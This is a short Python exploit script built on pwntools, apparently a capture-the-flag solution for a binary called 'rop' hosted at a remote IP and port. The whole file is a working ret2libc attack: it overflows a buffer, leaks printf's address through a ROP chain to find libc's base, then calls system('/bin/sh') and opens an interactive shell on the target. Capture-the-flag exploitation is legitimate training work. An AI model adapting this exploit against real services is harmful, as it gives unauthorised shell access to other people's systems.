from pwn import *
import sys

local = False
padding = 40

elf = ELF('./rop')
if local:
    io = elf.process()
else:
    io = remote("68.183.110.11", 2004)

#https://libc.rip/ libc database to find the version of libc used in remote
#pause()

pop_rdi = 0x000000000040122b
ret = 0x0000000000401016

pld = b""
pld += b"A" * padding
pld += p64(pop_rdi)
pld += p64(elf.got['printf'])
pld += p64(0x4011b1)
#pld += p64(ret)
pld += p64(elf.sym['vuln'])

io.sendlineafter(b"> ", pld)

printf_leak = u64(io.recv().strip().ljust(8, b"\x00"))
info(f"printf leak : {hex(printf_leak)}")
if local:
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
else:
    libc = ELF(sys.argv[1], checksec=False) #libc6_2.35-0ubuntu3.4_amd64.so
    
libc.address = printf_leak - libc.symbols["printf"]

info(f"printf leak: {hex(libc.address)}")

system = libc.sym["system"]
bin_sh = next(libc.search(b"/bin/sh\x00"))

info(f"adresse de system : {hex(system)}")
info(f"adresse de /bin/sh : {hex(bin_sh)}")


pld = b""
pld += b"A" * padding
pld += p64(pop_rdi)
pld += p64(bin_sh)
pld += p64(ret)
pld += p64(system)
io.sendline(pld)


io.interactive()
